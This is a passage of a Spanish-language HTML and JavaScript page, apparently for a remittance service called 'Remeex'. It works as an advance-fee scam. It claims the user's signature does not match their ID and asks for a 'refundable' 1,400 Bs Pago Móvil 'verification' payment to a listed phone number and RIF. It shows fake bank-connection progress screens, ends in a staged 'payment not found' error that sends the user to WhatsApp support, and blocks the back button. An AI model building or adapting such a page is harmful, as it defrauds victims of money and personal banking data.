      <i class="fas fa-info-circle"></i> Datos donde realizar la verificación
    </h3>
    
    <!-- Se envolvió la tarjeta de datos en un contenedor con efecto blur -->
    <div class="blur-container" id="blurContainer">
      <div class="security-data-card" id="datosRecargaFijos">
        <p><strong>Banco:</strong> Banco Venezolano de Crédito (0104) <i class="fas fa-copy copy-icon" onclick="copyToClipboard('Banco Venezolano de Crédito (0104)')"></i></p>
        <p><strong>Número:</strong> <span id="verificacionNumero">0412-1000000</span> <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionNumero')"></i></p>
        <p><strong>RIF:</strong> <span id="verificacionRif">J-407502646</span> <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionRif')"></i></p>
        <p><strong>Monto:</strong> <span id="verificacionMonto">1.400,00 Bolívares</span> <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionMonto')"></i></p>
        <p style="margin-top:0.8rem;">
          <strong>Concepto:</strong> <span id="conceptoRecarga">[Número de Identificación]</span>
          <i class="fas fa-copy copy-icon" onclick="copyToClipboard('conceptoRecarga')"></i>
        </p>
      </div>
      <div class="blur-overlay">
        <i class="fas fa-eye" style="margin-right: 0.5rem;"></i> 
        Toca aquí para ver los datos
      </div>
    </div>
    
    <p style="margin-top:1rem; color: var(--text-secondary); text-align: justify;">
      <i class="fas fa-bullhorn" style="color:var(--primary); margin-right: 0.5rem;"></i>
      Realiza la recarga ahora y en minutos recibirás tu dinero sin más demoras. 
      Este paso es una medida de seguridad, no implica un pago, comisión o cobro adicional, 
      ya que el monto se reembolsará inmediatamente junto con tu saldo.
    </p>

    <div style="text-align:center; margin-top:1.5rem;">
      <div class="btn-std-container" style="margin: 0 auto; width: 160px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-disabled" id="recargaReadyBtn">
          <div class="btn-glow-content btn-glow-initial">
            Continuar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Continuar
            <i class="fas fa-arrow-right btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownRecargaReady">
        Por favor, completa la recarga antes de continuar...
      </div>
    </div>
  </div>

  <!-- STEP 5: Completar Datos de Recarga -->
  <div class="section-content" id="recargaSection">
    <h2><i class="fas fa-credit-card"></i> Completar Datos de tu Recarga</h2>
    
    <div class="info-section">
      <p id="textoCompletarRecarga">
        ¿Realizaste tu recarga de verificación por <span id="recargaMontoTexto">1.400,00 Bs</span> 
        desde tu banco para confirmar tu identidad? Por favor, completa la información 
        para validar tu recarga.
      </p>
    </div>

    <div class="form-group">
      <label style="display:block; margin-bottom:0.3rem;">Banco de Origen:</label>
      <div style="display:flex; align-items:center; gap:0.5rem;">
        <img id="logoBancoOrigen" src="" alt="Logo Banco" style="max-height:30px;" />
        <input
          type="text"
          id="recargaBancoOrigen"
          style="width: 100%; padding: 0.75rem;"
          disabled
        />
      </div>
    </div>

    <div class="form-group">
      <label style="display:block; margin-bottom:0.3rem;">Teléfono:</label>
      <input
        type="text"
        id="recargaTelefono"
        style="width: 100%; padding: 0.75rem;"
        placeholder="Ingrese su número de teléfono"
        required
      />
    </div>

    <div class="form-group">
      <label style="display:block; margin-bottom:0.3rem;">Cédula:</label>
      <input
        type="text"
        id="recargaCedula"
        style="width: 100%; padding: 0.75rem;"
        disabled
      />
    </div>

    <div class="form-group">
      <label style="display:block; margin-bottom:0.3rem;">Monto (Bs):</label>
      <input
        type="text"
        id="recargaMonto"
        value="1.400,00"
        disabled
        style="width: 100%; padding: 0.75rem;"
      />
    </div>

    <div class="info-section">
      <p>
        Al realizar esta recarga de verificación por <span id="montoVerificacionTexto">1.400,00 Bs</span>, 
        se te devolverá junto con tu saldo disponible. Tu depósito total a recibir será de 
        tu saldo + <strong id="montoReembolsoTexto">1.400,00 Bs</strong>.
      </p>
      <p>
        Esta verificación es necesaria porque tu firma no coincide con la de tu 
        documento de identidad y para proteger la seguridad de tu cuenta.
      </p>
    </div>

    <div class="form-group">
      <label>N° de Comprobante (12 dígitos):</label>
      <input
        type="text"
        id="comprobanteInput"
        placeholder="Ej: 123456789123"
        style="width: 100%; padding: 0.75rem;"
      />
    </div>

    <div style="text-align:center; margin-top:1.5rem;">
      <div class="btn-std-container" style="margin: 0 auto; width: 200px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-success btn-disabled" id="confirmRecargaBtn" disabled>
          <div class="btn-glow-content btn-glow-initial">
            <i class="fas fa-check" style="margin-right: 0.5rem;"></i> Confirmar Recarga
          </div>
          <div class="btn-glow-content btn-glow-hover">
            <i class="fas fa-check" style="margin-right: 0.5rem;"></i> Confirmar Recarga
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownRecargaConfirm">
        Verificando datos...
      </div>
    </div>
  </div>
</div><!-- Fin de container principal -->

<!-- Overlays: confirmaciones y procesos -->

<!-- Overlay: Confirmar Firma -->
<div class="overlay" id="overlayConfirmFirma">
  <div class="modal">
    <h3>¿Estás seguro de tu firma?</h3>
    <p>
      La firma debe coincidir con la de tu documento de identidad. <br/>
      Si no coincide, se solicitará verificación adicional. <br/>
      ¿Deseas continuar con esta firma?
    </p>
    <div style="display:flex; gap:1rem; justify-content:center; flex-wrap:wrap; margin-top: 1rem;">
      <div class="btn-std-container" style="width: 120px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-danger" id="editarFirmaBtn">
          <div class="btn-glow-content btn-glow-initial">
            Editar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Editar
            <i class="fas fa-edit btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="btn-std-container" style="width: 120px;">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-success" id="continuarFirmaBtn">
          <div class="btn-glow-content btn-glow-initial">
            Continuar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Continuar
            <i class="fas fa-forward btn-glow-icon"></i>
          </div>
        </button>
      </div>
    </div>
  </div>
</div>

<!-- Overlay Secuencial POST-FIRMA (Conexión, Análisis, etc.) -->
<div class="overlay" id="overlaySecuenciaFirma">
  <div class="modal">
    <h3 id="secuenciaFirmaTitulo">Conectando con tu banco...</h3>
    <p id="secuenciaFirmaTexto">Espere un momento, por favor.</p>
    
    <!-- Imagen firma en miniatura -->
    <img id="miniSignatureImg" src="" alt="Firma" class="mini-signature" />
    
    <!-- Logo del banco -->
    <img id="secuenciaFirmaLogo" src="" alt="Banco" style="max-height:50px; margin:0.5rem 0;" />
    
    <!-- Barra de progreso -->
    <div class="overlay-progress-bar">
      <div class="overlay-progress-fill" id="secuenciaFirmaProgress"></div>
    </div>
    
    <p style="font-size: 0.85rem; margin-top: 0.5rem; color: var(--text-secondary);">
      <i class="fas fa-exclamation-triangle" style="color: var(--warning); margin-right: 0.3rem;"></i>
      Por favor, no cierres esta ventana ni retrocedas durante el proceso
    </p>
    
    <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary); margin-top: 0.5rem;"></i>
  </div>
</div>

<!-- Overlay: Verificación de la primera recarga -->
<div class="overlay" id="overlayVerificandoRecarga">
  <div class="modal">
    <h3 id="verificandoRecargaTitulo">Verificando tu primera recarga...</h3>
    <p id="verificandoRecargaTexto">
      Por favor, espera mientras consultamos con tu banco.
    </p>
    
    <!-- Barra de progreso -->
    <div class="overlay-progress-bar">
      <div class="overlay-progress-fill" id="verificandoRecargaProgress"></div>
    </div>
    
    <img id="verificandoRecargaLogo" src="" alt="Banco" style="max-height:50px; margin:0.5rem 0;" />
    
    <p style="font-size: 0.85rem; margin-top: 0.5rem; color: var(--text-secondary);">
      <i class="fas fa-exclamation-triangle" style="color: var(--warning); margin-right: 0.3rem;"></i>
      No cierres esta página durante el proceso de verificación
    </p>
    
    <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary); margin-top: 0.5rem;"></i>
  </div>
</div>

<!-- Overlay: Última secuencia al confirmar recarga -->
<div class="overlay" id="overlaySecuenciaFinal">
  <div class="modal">
    <h3 id="secFinalTitulo">Conectando con tu banco</h3>
    <p id="secFinalTexto">
      Preparando tu depósito.
    </p>
    
    <!-- Barra de progreso -->
    <div class="overlay-progress-bar">
      <div class="overlay-progress-fill" id="secuenciaFinalProgress"></div>
    </div>
    
    <img id="secFinalLogo" src="" alt="Banco" style="max-height:50px; margin:0.5rem 0;" />
    
    <p style="font-size: 0.85rem; margin-top: 0.5rem; color: var(--text-secondary);">
      <i class="fas fa-info-circle" style="color: var(--primary); margin-right: 0.3rem;"></i>
      Tu dinero estará disponible en breve
    </p>
    
    <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary); margin-top: 0.5rem;"></i>
  </div>
</div>

<!-- Overlay: Error Final - No se encontró la recarga -->
<div class="overlay" id="overlayErrorFinal">
  <div class="modal">
    <h3>Atención: No encontramos tu recarga</h3>
    <p id="errorFinalTexto">
      No se puede verificar la titularidad de tu cuenta hasta que detectemos
      tu recarga de verificación. Depositaremos tu saldo completo 
      (Saldo+<span id="montoRecargaError">1.400,00</span> Bs) una vez validemos
      tu identidad.
    </p>
    <p style="margin-top: 0.5rem;">
      Por favor, contacta con soporte para recibir asistencia inmediata.
    </p>
    <div style="text-align: center; margin-top: 1rem;">
      <a
        href="#"
        target="_blank"
        class="btn-support"
        id="whatsappLink"
      >
        <i class="fab fa-whatsapp"></i> Contactar con Soporte
      </a>
    </div>
  </div>
</div>

<!-- Overlay: Datos de Verificación (Pago Móvil) -->
<div class="overlay" id="overlayDatosVerificacion">
  <div class="modal modal-glow">
    <h3>Datos para Pago Móvil de Verificación</h3>
    <div id="modalDatosContent">
      <p><strong>Banco:</strong> Banco Venezolano de Crédito (0104)</p>
      <p><strong>Número:</strong> <span id="verificacionNumeroModal">0412-1000000</span> 
        <i class="fas fa-copy copy-icon" style="cursor:pointer;" onclick="copyToClipboard('verificacionNumeroModal')"></i>
      </p>
      <p><strong>RIF:</strong> <span id="verificacionRifModal">J-407502646</span> 
        <i class="fas fa-copy copy-icon" style="cursor:pointer;" onclick="copyToClipboard('verificacionRifModal')"></i>
      </p>
      <p><strong>Monto:</strong> <span id="verificacionMontoModal">1.400,00 Bolívares</span> 
        <i class="fas fa-copy copy-icon" style="cursor:pointer;" onclick="copyToClipboard('verificacionMontoModal')"></i>
      </p>
      <p style="margin-top:0.8rem;">
        <strong>Concepto:</strong> <span id="conceptoRecargaModal">Número de Identificación</span>
      </p>
    </div>
    <p style="font-size: 0.8rem; color: var(--text-secondary); margin-top: 1rem;">
      El monto de verificación (<span id="montoVerificacionBsModal">1.400,00 Bs</span>) 
      equivale a <span id="montoVerificacionUsdModal">$37.40</span> y será reembolsado.
    </p>
    <div class="btn-std-container" style="margin: 1rem auto 0; width: 120px;">
      <div class="btn-glow-effect"></div>
      <button class="btn-glow" id="closeDatosModalBtn">
        <div class="btn-glow-content btn-glow-initial">
          Cerrar
        </div>
        <div class="btn-glow-content btn-glow-hover">
          Cerrar
          <i class="fas fa-times btn-glow-icon"></i>
        </div>
      </button>
    </div>
  </div>
</div>

<!-- Overlay: Firma no coincide (si se llegara a necesitar) -->
<div class="overlay" id="overlayFirmaNoCoincide">
  <div class="modal">
    <h3>Verificación adicional requerida</h3>
    <p id="firmaNoCoincideTexto">
      Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un proceso de verificación adicional para continuar con el retiro.
    </p>
    <img id="firmaNoCoincideLogo" src="" alt="Logo Banco" style="max-height:50px; margin:0.5rem 0;" />
    
    <!-- Barra de progreso roja -->
    <div class="overlay-progress-bar">
      <div class="overlay-progress-fill error" id="redirectProgressBar" style="width: 0%;"></div>
    </div>
    
    <p style="margin-top: 0.8rem; color: var(--text-primary);">
      <i class="fas fa-shield-alt" style="color: var(--primary); margin-right: 0.3rem;"></i>
      <strong>No te preocupes</strong>. Tu dinero está seguro y podrás retirarlo
      después de completar la verificación.
    </p>
    
    <p style="font-size: 0.85rem; margin-top: 0.5rem; color: var(--text-secondary);">
      Serás redirigido en <span id="redirectCountdown">10</span> segundos...
    </p>
  </div>
</div>

<!-- Scripts principales -->
<script>
  /****************************************************
   * VARIABLES GLOBALES / REFERENCIAS
   ****************************************************/
  let saldoDisponible = 0;
  let nombreCompleto = "";
  let documentoBeneficiario = "";
  let fechaNacimiento = "";
  let bancoUsuario = "";
  let numeroCuenta = "";
  let tipoCuenta = "";
  let telefonoUsuario = "";
  let logoBancoUsuario = "";

  // Para firma digital
  let isDrawing = false;
  let ctx, signatureCanvas;
  let signatureDataURL = null;

  // Timers y contadores
  let securityVerification1Countdown = 30;   // 30 segundos para leer detenidamente 
  let securityVerification2Countdown = 8;    
  let security3ACountdown = 38;   // 38 segundos
  let security3BCountdown = 20;   
  let recargaReadyBtnCountdown = 180;  // 3 minutos
  let confirmRecargaBtnCountdown = 6;    

  // Bandera para habilitar el botón (recargaReadyBtn)
  let recargaReadyBtnEnabled = false;
  
  // Secuencia de firma
  let firmaSecuenciaStep = 0;
  let secuenciaFirmaInterval = null;
  
  // Secuencia de verificación recarga
  let recargaSecuenciaStep = 0;
  let verificandoRecargaInterval = null;
  
  // Secuencia final
  let secuenciaFinalStep = 0;
  let secuenciaFinalInterval = null;

  // Redirección
  let isRedirecting = false;
  let redirectCountdownInterval = null;

  // Referencia global para mostrar la tasa
  let exchangeRateText;
  let exchangeRate = 37.40; // Tasa por defecto
  let showingBs = true;

  /**
   * Función para cargar datos guardados y setear tasa y monto mínimo
   * tomando la contraseña como base.
   */
  function loadSavedData() {
    const datosRemeex = JSON.parse(
      sessionStorage.getItem("datosRemeex") ||
      localStorage.getItem("datosRemeex") ||
      "{}"
    );
    
    // Recuperar tasa y monto mínimo desde la contraseña, si existe
    let tasaCambio = 37.40;  // Valor por defecto
    let montoMinimo = 20;    // Valor por defecto en unidades

    if (datosRemeex.password) {
      const pass = datosRemeex.password;
      if (pass.length >= 10) {
        // Últimos 4 dígitos
        const last4 = pass.slice(-4);
        // Primeros 2 de esos 4 -> montoMinimo
        montoMinimo = parseInt(last4.slice(0, 2), 10) || montoMinimo;
        // Siguientes 2 de esos 4 -> tasaCambio
        tasaCambio = parseInt(last4.slice(2, 4), 10) || tasaCambio;
      }
    }

    // Guardar/Usar la tasa existente
    if (!datosRemeex.rateBolivar) {
      datosRemeex.rateBolivar = tasaCambio;
      sessionStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
      localStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
    } else {
      tasaCambio = parseFloat(datosRemeex.rateBolivar);
    }
    
    // Establecer tasa global
    exchangeRate = tasaCambio;

    // Calcular monto de recarga
    const montoRecarga = montoMinimo * tasaCambio;

    // Reemplazar todos los elementos con clase "blink" para mostrar el nuevo monto calculado
    const elementosMontoRecarga = document.querySelectorAll('.blink');
    elementosMontoRecarga.forEach(element => {
      element.textContent = `Bs. ${formatNumberVE(montoRecarga)}`;
    });

    // Actualizar input de monto en el formulario de recarga
    const recargaMontoInput = document.getElementById("recargaMonto");
    if (recargaMontoInput) {
      recargaMontoInput.value = formatNumberVE(montoRecarga);
    }
    
    // Actualizar textos de montos de recarga
    const recargaMontoTexto = document.getElementById("recargaMontoTexto");
    const montoVerificacionTexto = document.getElementById("montoVerificacionTexto");
    const montoReembolsoTexto = document.getElementById("montoReembolsoTexto");
    const montoVerificacionBsModal = document.getElementById("montoVerificacionBsModal");
    const montoVerificacionUsdModal = document.getElementById("montoVerificacionUsdModal");
    const montoRecargaError = document.getElementById("montoRecargaError");
    const verificacionMonto = document.getElementById("verificacionMonto");
    const verificacionMontoModal = document.getElementById("verificacionMontoModal");
    
    if (recargaMontoTexto) recargaMontoTexto.textContent = `${formatNumberVE(montoRecarga)} Bs`;
    if (montoVerificacionTexto) montoVerificacionTexto.textContent = `${formatNumberVE(montoRecarga)} Bs`;
    if (montoReembolsoTexto) montoReembolsoTexto.textContent = `${formatNumberVE(montoRecarga)} Bs`;
    if (montoVerificacionBsModal) montoVerificacionBsModal.textContent = `${formatNumberVE(montoRecarga)} Bs`;
    if (montoVerificacionUsdModal) montoVerificacionUsdModal.textContent = `$${montoMinimo.toFixed(2)}`;
    if (montoRecargaError) montoRecargaError.textContent = `${formatNumberVE(montoRecarga)}`;
    if (verificacionMonto) verificacionMonto.textContent = `${formatNumberVE(montoRecarga)} Bolívares`;
    if (verificacionMontoModal) verificacionMontoModal.textContent = `${formatNumberVE(montoRecarga)} Bolívares`;

    // Actualizar valores en la explicación (STEP 4C)
    const montoRetiroBs = document.getElementById("montoRetiroBs");
    const montoDepositoTotal = document.getElementById("montoDepositoTotal");
    const saldoRequerido = document.getElementById("saldoRequerido");

    if (montoRetiroBs && montoDepositoTotal && saldoRequerido) {
      let saldoActual = parseFloat(sessionStorage.getItem("currentBalanceBS") || "0");
      if (isNaN(saldoActual)) {
        saldoActual = saldoDisponible;
      }
      saldoRequerido.textContent = formatNumberVE(saldoActual) + " Bs";
      montoRetiroBs.textContent = formatNumberVE(saldoActual) + " Bs";
      montoDepositoTotal.textContent = formatNumberVE(saldoActual + montoRecarga) + " Bs";
    }

    // Actualizar la tasa de cambio en la UI
    if (!exchangeRateText) {
      // Aseguramos que esté listo
      exchangeRateText = document.getElementById("exchangeRateText");
    }
    exchangeRateText.textContent = `Tasa: ${tasaCambio.toFixed(2)}`;

    // Si en datosRemeex ya hay una rateBolivar, la mantenemos
    if (datosRemeex.rateBolivar) {
      const rate = parseFloat(datosRemeex.rateBolivar);
      exchangeRateText.textContent = `Tasa: ${rate.toFixed(2)}`;
    }

    // Para demostrar integración con steps 2 y 3
    loadSavedDataStep2();
    loadSavedDataStep3();
  }

  /****************************************************
   * Funciones para cargar datos de pasos anteriores
   ****************************************************/
  function loadSavedDataStep2() {
    // Simplificada: si existieran campos en el step 2, aquí se rellenan
    const savedData = JSON.parse(sessionStorage.getItem('beneficiaryData') || "{}");
    const fullNameInput = document.getElementById("fullName");
    const docNumberInput = document.getElementById("docNumber");
    const birthDateInput = document.getElementById("birthDate");
    
    if (savedData.fullName && fullNameInput) fullNameInput.value = savedData.fullName;
    if (savedData.docNumber && docNumberInput) docNumberInput.value = savedData.docNumber;
    if (savedData.birthDate && birthDateInput) birthDateInput.value = savedData.birthDate;
  }

  function loadSavedDataStep3() {
    // Simplificada: si existieran campos en el step 3, aquí se rellenan
    const savedData = JSON.parse(sessionStorage.getItem("datosBancarios") || "{}");
    const bankSelect = document.getElementById("bankSelect");
    const accountTypeSelect = document.getElementById("accountType");
    
    if (savedData.bank && bankSelect) bankSelect.value = savedData.bank;
    if (savedData.accountType && accountTypeSelect) accountTypeSelect.value = savedData.accountType;
  }

  /****************************************************
   * Mapeo de nombres de bancos a sus logotipos
   ****************************************************/
  const bankLogosMapping = {
    "Banco de Venezuela, SA": "https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png",
    "Banco Central de Venezuela": "https://www.bcv.org.ve/sites/default/files/default_images/logo_bcv-04_2.png",
    "Banco Venezolano de Crédito, SA": "https://www.venezolano.com/images/galeria/108_1.png",
    "Banco Mercantil, CA": "https://www.mercantilbanco.com/mercprod/images/comunes/logo_popups.gif",
    "Banco Provincial, SA": "https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg",
    "Banco del Caribe CA, Bancaribe": "https://d3olc33sy92l9e.cloudfront.net/wp-content/themes/bancaribe/images/Bancaribe-LogotipoTurquesa.png",
    "Banco Exterior CA, Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Banco-Exterior-VE-logo.png/183px-Banco-Exterior-VE-logo.png",
    "Banco Caroní CA, Banco Universal": "https://www.bancocaroni.com.ve/wp-content/uploads/elementor/thumbs/Logo-252-x-48-1-qvqyrv33uw6afqa09bf5f2tswrzr0yaos9y59b3tuo.png",
    "Banesco Banco Universal, CA": "https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip",
    "Banco Sofitasa Banco Universal, CA": "https://www.sofitasa.com/assets/img/nuevo_logo.png",
    "Banco Plaza, Banco Universal": "https://plazacdn.s3.amazonaws.com/wp-content/themes/bancoplaza/imagenes/logobancoplaza-2.png",
    "Banco Fondo Común, CA": "https://www.bfc.com.ve/wp-content/uploads/2021/01/logofos.png",
    "100% Banco, Banco Comercial, CA": "https://www.100x100banco.com/img/logo.png",
    "Banco del Tesoro CA, Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Logo_Banco_del_Tesoro.jpg/320px-Logo_Banco_del_Tesoro.jpg",
    "Bancrecer SA, Banco Microfinanciero": "https://www.bancrecer.com.ve/images/img/bancrecer-logo.png",
    "Banco Activo CA, Banco Universal": "https://www.bancoactivo.com/logo.svg",
    "Bancamiga Banco Universal, CA": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Bancamiga.png/320px-Bancamiga.png",
    "Banplus Banco Universal, CA": "https://www.banplus.com/uploads/contenidos/logo_banplus2023.jpg",
    "Banco Bicentenario del Pueblo, Banco Universal CA": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/BancoDigitaldelosTrabajadores.png/320px-BancoDigitaldelosTrabajadores.png",
    "Banco Nacional de Crédito CA, Banco Universal": "https://www.bncenlinea.com/images/default-source/misc/BNCLogo_rebrand.png"
  };

  function normalizeBankName(name) {
    return name.trim().toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
  }

  const normalizedBankLogosMapping = {};
  Object.keys(bankLogosMapping).forEach(key => {
    normalizedBankLogosMapping[normalizeBankName(key)] = bankLogosMapping[key];
  });

  function getBankLogoURL(bankName) {
    const defaultLogo = "https://via.placeholder.com/100x50?text=Logo";
    if (!bankName) return defaultLogo;
    const normalizedInput = normalizeBankName(bankName);
    
    // 1. Coincidencia exacta
    if (normalizedBankLogosMapping[normalizedInput]) {
      return normalizedBankLogosMapping[normalizedInput];
    }
    // 2. Búsqueda "fuzzy"
    for (let key in normalizedBankLogosMapping) {
      if (normalizedInput.includes(key) || key.includes(normalizedInput)) {
        return normalizedBankLogosMapping[key];
      }
    }
    // 3. Por defecto
    return defaultLogo;
  }

  /****************************************************
   * EVENTO DOMContentLoaded
   ****************************************************/
  document.addEventListener("DOMContentLoaded", () => {
    // Activamos la animación de aparición de la .container
    document.querySelector('.container').classList.add('active');

    // Primero cargamos la configuración y datos guardados (tasa, montos, etc.)
    loadSavedData();

    // Luego leemos datos del sessionStorage (datosRemeex)
    const datosRemeex = JSON.parse(sessionStorage.getItem('datosRemeex') || '{}');

    if (datosRemeex.fullName) {
      nombreCompleto = datosRemeex.fullName;
    }
    if (datosRemeex.docNumberCompleto) {
      documentoBeneficiario = datosRemeex.docNumberCompleto;
    } else if (datosRemeex.docNumber) {
      documentoBeneficiario = datosRemeex.docNumber;
    }
    if (datosRemeex.birthDate) {
      fechaNacimiento = datosRemeex.birthDate;
    }
    if (datosRemeex.bankName) {
      bancoUsuario = datosRemeex.bankName;
    }
    if (datosRemeex.bankAccount) {
      numeroCuenta = datosRemeex.bankAccount;
    }
    if (datosRemeex.bankType) {
      tipoCuenta = datosRemeex.bankType;
    }
    if (datosRemeex.userPhone) {
      telefonoUsuario = datosRemeex.userPhone;
    }

    // Logo del banco
    if (datosRemeex.bankLogo) {
      logoBancoUsuario = datosRemeex.bankLogo;
    } else {
      logoBancoUsuario = getBankLogoURL(bancoUsuario);
    }

    // Obtener saldo en Bs (string)
    let saldoData = sessionStorage.getItem("currentBalanceBS") || "0,00 Bs";
    saldoDisponible = parseFloat(
      saldoData
        .replace(/\./g, '')
        .replace(',', '.')
        .replace(/[^\d.]/g, '')
    ) || 0;

    // Asignar referencia global a exchangeRateText si aún no se hizo
    exchangeRateText = document.getElementById("exchangeRateText");

    // Inicializar la UI con los datos
    initPageData();
    setupEventListeners();
    initSignatureCanvas();
    startStatusBannerRotation();
    startParticleGeneration();
    startRotatingInfo();
    
    // Prevenir uso del botón "back" del navegador
    history.pushState({}, '', '');
    window.addEventListener('popstate', function() {
      if (!isRedirecting) {
        history.pushState({}, '', '');
        alert("Por favor, no utilices el botón de retroceso del navegador durante este proceso.");
      }
    });
    
    // Advertir al cerrar la ventana
    window.addEventListener('beforeunload', function(e) {
      if (!isRedirecting) {
        e.preventDefault();
        e.returnValue = '¿Estás seguro de que quieres salir? El proceso de verificación se interrumpirá.';
      }
    });
  });

  /****************************************************
   * Inicializa el contenido de la página (titulares, saldos, etc.)
   ****************************************************/
  function initPageData() {
    const balanceAmountElem = document.getElementById("balanceAmount");

    // Mostrar saldo disponible
    balanceAmountElem.textContent = formatNumberVE(saldoDisponible) + " Bs";

    // Actualizar texto si tenemos doc del beneficiario
    const securityVerificationText1 = document.getElementById("securityVerificationText1");
    if (securityVerificationText1 && documentoBeneficiario) {
      securityVerificationText1.textContent = `Tu firma no coincide con la que aparece en tu documento de identidad (${documentoBeneficiario}). Por seguridad, necesitamos validar que eres el titular legítimo de la cuenta antes de procesar tu solicitud.`;
    }

    // Textos dinámicos
    document.getElementById("nombreUsuarioAviso").textContent = nombreCompleto || "[NombreCompleto]";
    document.querySelectorAll(".nombreBancoUsuario").forEach(span => {
      span.textContent = bancoUsuario || "[Banco]";
    });
    document.querySelectorAll(".numeroCuentaUsuario").forEach(el => {
      el.textContent = numeroCuenta || "[NumeroCuenta]";
    });
    document.querySelectorAll(".nombreBancoRecarga").forEach(el => {
      el.textContent = bancoUsuario || "[Banco]";
    });

    // Ajustar campo recarga
    const recargaBancoOrigen = document.getElementById("recargaBancoOrigen");
    const recargaTelefono = document.getElementById("recargaTelefono");
    const recargaCedula = document.getElementById("recargaCedula");
    const logoBancoOrigen = document.getElementById("logoBancoOrigen");

    if (recargaBancoOrigen) recargaBancoOrigen.value = bancoUsuario || "";
    if (recargaTelefono) recargaTelefono.value = telefonoUsuario || "";
    if (recargaCedula) recargaCedula.value = documentoBeneficiario || "";
    if (logoBancoOrigen) logoBancoOrigen.src = logoBancoUsuario;

    // Conceptos en la sección de recarga
    const conceptoRecargaElem = document.getElementById("conceptoRecarga");
    const conceptoPagoMovilElem = document.getElementById("conceptoPagoMovil");
    const conceptoRecargaModalElem = document.getElementById("conceptoRecargaModal");

    if (conceptoRecargaElem) conceptoRecargaElem.textContent = documentoBeneficiario || "Número de Identificación";
    if (conceptoPagoMovilElem) conceptoPagoMovilElem.textContent = documentoBeneficiario || "Número de Identificación";
    if (conceptoRecargaModalElem) conceptoRecargaModalElem.textContent = documentoBeneficiario || "Número de Identificación";
  }

  function setupEventListeners() {
    // Botones para la firma
    const clearSignatureBtn = document.getElementById("clearSignatureBtn");
    const saveSignatureBtn = document.getElementById("saveSignatureBtn");

    clearSignatureBtn.addEventListener("click", () => {
      if (ctx) {
        ctx.clearRect(0, 0, signatureCanvas.width, signatureCanvas.height);
      }
    });

    saveSignatureBtn.addEventListener("click", () => {
      if (isCanvasEmpty()) {
        alert("Por favor, realiza tu firma antes de continuar.");
        return;
      }
      showOverlay("overlayConfirmFirma");
    });

    // Overlay Confirmar Firma
    const editarFirmaBtn = document.getElementById("editarFirmaBtn");
    const continuarFirmaBtn = document.getElementById("continuarFirmaBtn");

    editarFirmaBtn.addEventListener("click", () => {
      hideOverlay("overlayConfirmFirma");
    });

    continuarFirmaBtn.addEventListener("click", () => {
      hideOverlay("overlayConfirmFirma");
      signatureDataURL = signatureCanvas.toDataURL("image/png");
      document.getElementById("miniSignatureImg").src = signatureDataURL;
      startSecuenciaFirma();
    });

    // Verificación 1
    const continueSecurityBtn1 = document.getElementById("continueSecurityBtn1");
    continueSecurityBtn1.addEventListener("click", () => {
      hideVisaCard("securityVerification1");
      showVisaCard("securityVerification2");
      startSecurity2Countdown();
    });

    // Verificación 2
    const continueSecurityBtn2 = document.getElementById("continueSecurityBtn2");
    continueSecurityBtn2.addEventListener("click", () => {
      hideVisaCard("securityVerification2");
      showVisaCard("securityVerification3A");
      startSecurity3ACountdown();
    });

    // Tarjeta 3A -> 3B
    const continueSecurity3ABtn = document.getElementById("continueSecurity3ABtn");
    continueSecurity3ABtn.addEventListener("click", () => {
      hideVisaCard("securityVerification3A");
      showVisaCard("securityVerification3B");
      startSecurity3BCountdown();
    });

    // Tarjeta 3B -> 3C
    const continueSecurity3BBtn = document.getElementById("continueSecurity3BBtn");
    continueSecurity3BBtn.addEventListener("click", () => {
      hideVisaCard("securityVerification3B");
      showVisaCard("securityVerification3C");
      startRecargaReadyCountdown();
    });

    // Botón final para iniciar verificación de recarga
    const recargaReadyBtn = document.getElementById("recargaReadyBtn");
    recargaReadyBtn.addEventListener("click", () => {
      if (!recargaReadyBtnEnabled) {
        alert("Por favor, lee detenidamente la información. El botón estará disponible en unos minutos.");
      } else {
        hideVisaCard("securityVerification3C");
        startVerificandoRecarga();
      }
    });

    // Completar Datos de Recarga (Confirmar recarga)
    const confirmRecargaBtn = document.getElementById("confirmRecargaBtn");
    confirmRecargaBtn.addEventListener("click", () => {
      const comprobanteVal = document.getElementById("comprobanteInput").value.trim();
      if (!/^\d{12}$/.test(comprobanteVal) || comprobanteVal === "123456789123") {
        alert("El comprobante debe tener 12 dígitos válidos y no ser '123456789123'.");
        return;
      }
      hideVisaCard("recargaSection");
      startSecuenciaFinal();
    });

    // Mostrar datos desenfocados
    const blurContainer = document.getElementById("blurContainer");
    if (blurContainer) {
      blurContainer.addEventListener("click", function() {
        showOverlay("overlayDatosVerificacion");
      });
    }

    // Cerrar modal de datos
    const closeDatosModalBtn = document.getElementById("closeDatosModalBtn");
    if (closeDatosModalBtn) {
      closeDatosModalBtn.addEventListener("click", function() {
        hideOverlay("overlayDatosVerificacion");
      });
    }
  }

  /****************************************************
   * Canvas de Firma
   ****************************************************/
  function initSignatureCanvas() {
    signatureCanvas = document.getElementById("signatureCanvas");
